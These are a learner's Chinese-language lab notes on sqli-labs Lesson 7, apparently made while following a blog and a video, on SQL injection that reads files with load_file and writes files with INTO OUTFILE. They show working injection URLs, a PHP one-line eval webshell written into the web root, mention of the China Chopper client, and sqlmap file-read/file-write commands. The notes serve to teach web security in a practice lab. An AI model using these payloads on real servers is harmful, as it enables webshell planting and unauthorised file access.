# Lab 7 GET - Dump into outfile - String （导出文件GET字符型注入）

## 以下是博客学习内容

+ 概要：把查询结果导出到文件中，常用语句为 `select "<?php @eval($_POST['giantbranch']);?>" into outfile "XXX\test.php" `， 当然要获取网站在系统中的具体路径（绝对路径） -- 怎么获取？根据系统和数据库猜测（那就是经验咯）；当然不是啦，SQL中有提供函数which有很大可能让我们获取到这个路径，看吧，用lab3的环境 -- 

@@datadir -- 读取数据库的路径

@@basedir -- 安装MYSQL路径

![7_1](.\images\7_1.png)

+ ps：在这里关于导出sql查询结果到文件的时候需要注意设置sql里面的secure-file-priv属性，若报以下错误可以参考`坑.md`

+ [ ] <?php @eval($_POST['giantbranch']);?>" -- 这句话不知道是干啥用的诶？？！？！先空着，学习后面的先

+ 话说这次lab就是为了让我们知道有导出文件这一操作吗 -- 看一波视频先

## 以下是视频学习内容

+ 概要：mysql可以对文件进行读写，但是要权限足够 -- 用户权限最好要有root & secure_file_priy指定目录,以下命令查看secure_file_priv指定目录情况

```mysql
show global variables like "secure_file_priv"
```

完了以后参考`坑.md`即可配置secure_file_priv相关信息

+ 读文件

```mysql
mysql命令行中
select load_file("C:\\sqlread_test.txt") -- 注意要用\\而不是\
```

```
http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,load_file("C:\\sqlread_test.txt") --+
```

+ 写文件

'<?php phpinfo();?>' -- 会返回当前的网站配置信息

```
http://localhost/sqli-labs-master/Less-7/?id=0')) union select 1,2,'<?php phpinfo();?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php' --+
```

打开`1.php`发现

![7_2](.\images\7_2.png)

+ 写入webshell

  + 一句话木马 -- <?php @eval($_POST['x']);?>
  + @屏蔽错误信息
  + 把输入的'x'都当做命令
  + 使用中国菜刀可以连接，连接了以后就可以为所欲为了，x相当于连接密码

+ sqlmap测试

  + sqlmap -hh 查看详细的帮助信息

    ```
    sqlmap -u "http://localhost/sqli/Less-7/?id=1" --file-read "G:\\flag.txt" -- 读取网站上的文件
    sqlmap -u "" --file-write local_file --file-dest destination_filedir_in_web -- 把本地的某个文件上传到网站上某个位置
    ```

    